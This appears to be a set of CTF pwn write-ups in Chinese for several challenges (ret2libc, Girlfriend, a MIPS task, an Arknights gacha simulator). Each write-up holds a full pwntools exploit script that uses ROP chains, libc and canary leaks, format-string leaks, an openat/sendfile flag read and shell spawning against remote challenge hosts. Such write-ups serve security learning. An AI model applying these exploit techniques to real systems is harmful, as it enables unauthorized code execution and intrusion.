# Ret2libc's Revenge
ret2libc的题目，但开启了setvbuf(stdout, 0, 0, 0)导致需要将输出缓冲区填满才能有输出
Exp:
```Python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
ip, port = "8.147.132.32:18505".split(":")
elf_path = './ret2libc'
local = False
debug = False
debugger = '''
    b main
    b *0x401261
'''
if local:
    p = process(elf_path)
    if debug:
        gdb.attach(p, debugger)
else:
    p = remote(ip, port)

# p.sendline()
elf = ELF(elf_path)
libc = ELF('./libc.so.6')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
mov_rsi_rdi = 0x401180
add_rsi_qptr_rbp_20 = 0x4010e9
and_rsi = 0x4010e4
mov_eax_0_pop_rbp_ret = 0x4011f8
leave_ret = 0x401279
ret = 0x4010a0

# payload = b'a' * (0x218) + p64(0x1f00000218) + b'b' * (0x6)
# 由于他是先将gets到的数据存在heap里再一位一位读入栈中，在rbp前面是存放下标的位置需要注意不能乱覆盖，
# 需要控制使其继续向下覆盖
payload = p64(0x0).ljust(0x218, b'a') + b'\x18\x02\x00\x00\x1f\x00'
payload += p64(0x400600 - 0x20) # 0x400600存有puts函数的plt的地址，将其赋给rsi然后给rdi
payload += p64(and_rsi)
payload += p64(add_rsi_qptr_rbp_20)
payload += p64(mov_rsi_rdi)
payload += p64(puts_plt)
payload += p64(0x4011ff)
p.sendline(payload)

# 填充输出缓冲区，这里将rdi的值换为puts的实际地址可以一次性输出多一些
for i in range(150):
    payload = p64(0x0).ljust(0x218, b'a') + b'\x18\x02\x00\x00\x1f\x00'
    payload += p64(0x404018 - 0x20)
    payload += p64(and_rsi)
    payload += p64(add_rsi_qptr_rbp_20)
    payload += p64(mov_rsi_rdi)
    payload += p64(puts_plt)
    payload += p64(0x4011ff)
    p.sendline(payload)
    sleep(0.05)
    print(i)

p.recvuntil(b'Revenge\n')
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f'puts_addr: {hex(puts_addr)}')
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
pop_rdi = libc_base + 0x2a3e5
gadget = [0xebd38, 0xebd3f, 0xebd43, 0xebc85, 0xebc88]
pop_r12 = libc_base + 0x35731

payload = p64(0x0).ljust(0x218, b'a') + b'\x18\x02\x00\x00\x1f\x00'
payload += p64(0x404999)
payload += p64(pop_r12) + p64(0)
payload += p64(libc_base + gadget[0])
# payload += p64(ret)
# payload += p64(pop_rdi)
# payload += p64(binsh_addr)
# payload += p64(system_addr)

# gdb.attach(p, 'b *0x401261')
p.sendline(payload)

p.interactive()
```
# Girlfriend
综合类型的题目，可以用格式化字符串漏洞泄漏出栈地址，libc地址和code段基址。
题目没给libc版本，也没有gadgets，也不能修改got表，本来以为要用非栈上格式化字符串漏洞去做，后来师傅说去靶机上找到libc版本是2.35，就可以构造ORW了。
```Python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
ip, port = "47.94.172.18:22711".split(":")
elf_path = './girlfriend'
libc_path = "./libc.so.6"
local = False
debug = True
debugger = '''
    b main
'''
if local:
    p = process(elf_path)
    if debug:
        gdb.attach(p, debugger)
else:
    p = remote(ip, port)

def choose(idx):
    p.sendlineafter(b'Choice:\n', str(idx).encode())

def Reply(name):
    choose(3)
    p.sendafter(b'first\n', name)

def Buyflower():
    choose(2)
    p.sendlineafter(b'Y/N\n', b'Y')

def girlfriend(say):
    choose(1)
    p.sendlineafter(b'her?\n', say)

elf = ELF(elf_path)
libc = ELF(libc_path)
printf_plt = elf.plt['printf']
system_plt = 0x103f88
setvbuf_plt = 0x103fb0
leave_ret = 0x101676

payload = b'a' * 0x17
girlfriend(payload)
p.recvuntil(b'a\n')
code_base = u64(p.recv(6) + b'\x00\x00') - 0x1015c7
log.success('code_base: ' + hex(code_base))
flag = code_base + 0x1021ef

payload = b'-%15$p-%37$p-'.ljust(0x30, b'a')
payload += p64(0x100)
Reply(payload)
p.recvuntil(b'name:\n')
recv = p.recv().split(b'-')
canary = int(recv[1], 16)
_rtld_global = int(recv[2], 16) - 128
log.success('canary: ' + hex(canary))
libc_base = _rtld_global - libc.sym['__libc_start_main']
pop_rdi = libc_base + 0x2a3e5
pop_r12 = libc_base + 0x35731
pop_rbx = libc_base + 0x35dd1
pop_rsi = libc_base + 0x2be51
pop_rdx_r12 = libc_base + 0x11f2e7
xor_r10_mov_eax_r10 = libc_base + 0x1498f8
system_addr = libc_base + libc.sym['system']
read_addr = libc_base + libc.sym['read']
openat_addr = libc_base + libc.sym['openat']
write_addr = libc_base + libc.sym['write']
mmap_addr = libc_base + libc.sym['mmap']
sendfile_addr = libc_base + libc.sym['sendfile']
mprotect_addr = libc_base + libc.sym['mprotect']
log.success('libc_base: ' + hex(libc_base))
log.success('pop_rdi: ' + hex(pop_rdi))

payload = b'a' * (0x28 - 0x1)
girlfriend(payload)
p.recvuntil(b'a\n')
stack = u64(p.recv(6) + b'\x00\x00') - 0x20
log.success('stack: ' + hex(stack))

payload = b'./flag'.ljust(0x30, b'a')
payload += p64(0x100)
Reply(payload)
gadgets = [0xef4ce]

payload = flat([
    code_base + 0x104060,
    code_base + 0x101749,
    code_base + 0x104060,
    pop_rdx_r12, 0, b'./flag\x00\x00',
    code_base + leave_ret,
    canary,
    stack - 0x40,
    code_base + leave_ret,
])
choose(1)
p.sendafter(b'her?\n', payload)

payload = flat([
    code_base + 0x104060 + 0x40,
    # 构造openat
    pop_rdi, -100,
    pop_rsi, stack - 0x18,
    pop_rdx_r12, 0, 0,
    xor_r10_mov_eax_r10,
    openat_addr,
    # 构造sendfile
    pop_rdi, 1,
    pop_rsi, 3,
    pop_rdx_r12, 0, 0,
    sendfile_addr
])
pause()
p.send(payload)

p.interactive()
```
# EZ3.0
第一次遇见MIPS架构的题目，后面再写专门的知识点。
题目很简单，有`system`函数，有`/bin/cat falg.txt`，只需要找到`gadgets`来赋值即可
![[Pasted image 20250427152823.png]]果`disasmble`一下又出来了
圈中部分即是`gadgets`，`a0`存放`/bin/cat`的地址，然后`t9`跳转`system`即可
```Python
from pwn import *

context(arch='mips', endian='little', log_level='debug')
ip, port = "47.94.204.178:37016".split(":")
elf_path = './EZ3'
local = False
debug = False
debugger = '''
    b main
'''
if local:
    p = process(["qemu-mipsel", "-g", "1234", "-L", "/usr/mipsel-linux-gnu/", elf_path])
    if debug:
        gdb.attach(p, gdbscript='''
            target remote localhost:1234
            b *0x400830
            c
        ''')

else:
    p = remote(ip, port)

elf = ELF(elf_path)
bss = elf.bss()
system = elf.sym['system']
read = elf.sym['read']
binls = 0x400c88
bincat = 0x411010
backdoor = 0x4009c8
ret = 0x400a14

payload = b'/bin/sh\x00'.ljust(0x24, b'a') + p32(0x400ab0) + b'a' * 0x4 * 7 + p32(0x0) + p32(0x1) + p32(0x1) + p32(bincat) + p32(0x0) * 2 + p32(0x400aa4)
payload = flat([
    b'a' * 0x24,
    p32(0x400a1c),
    p32(0),
    p32(system),
    p32(bincat)
])
p.sendlineafter(b'> ', payload)

p.interactive()
```
# 明日方舟寻访模拟器
没找到`getshell`的方法，有个大胆的想法，控制抽出来的卡，让其在内存里刚好显示为`/bin/sh`，这样就可以得到地址存`/bin/sh`了。
思路没错，后来问了组里做出来的师傅，就是这么做的，只是不需要让其为/bin/sh，让其为 $0, /sh 一样可以获取shell，而且控制难度要小很多。
官方wp还是更简单，有一个位置直接存的是抽卡总次数，也不用控制三星了，直接抽这个次数的卡就行了。
```Python
from pwn import *

context(arch="amd64", os="linux", log_level="debug")
elf_path = "./arknights"
local = False
debug = False
debugscripts = '''
    b main
'''
if local:
    p = process(elf_path)
    if debug:
        gdb.attach(p, debugscripts)
else:
    ip, port = "gz.imxbt.cn:20831".split(":")
    p = remote(ip, port)

rdi = 0x4018e5
ret = 0x40101a
system = 0x4018FC
count = 0x405BCC

payload = b'a'*0x48+p64(rdi)+p64(count)+p64(system)

def ck(n):
    p.recv()
    p.sendline(b'3')
    p.recv()
    p.sendline(str(n).encode())
    p.sendline(b'\n')

p.sendline(b'a')
ck(10000)
ck(2324)

p.recv()
p.sendline(b'4')
p.recv()
p.sendline(b'1')
p.sendline(payload)

pause()
p.sendline(b'exec 1>&2')

p.interactive()
```
# 奶龙回家

# heap2

# web苦手
需要使注册密码和登陆密码一个比0x40长一个比0x40短的同时，两者又完全一样，没想到好方法
# bot
protobuf + FSOP的题目